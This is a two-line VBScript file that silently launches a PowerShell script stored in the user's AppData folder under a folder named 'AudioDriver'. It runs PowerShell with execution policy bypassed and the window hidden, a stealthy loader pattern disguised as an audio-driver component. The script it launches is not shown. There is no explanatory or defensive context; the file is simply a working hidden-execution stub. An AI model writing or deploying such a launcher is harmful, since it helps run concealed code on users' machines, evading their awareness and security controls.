Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File %APPDATA%\AudioDriver\AudioHost.ps1", 0, False
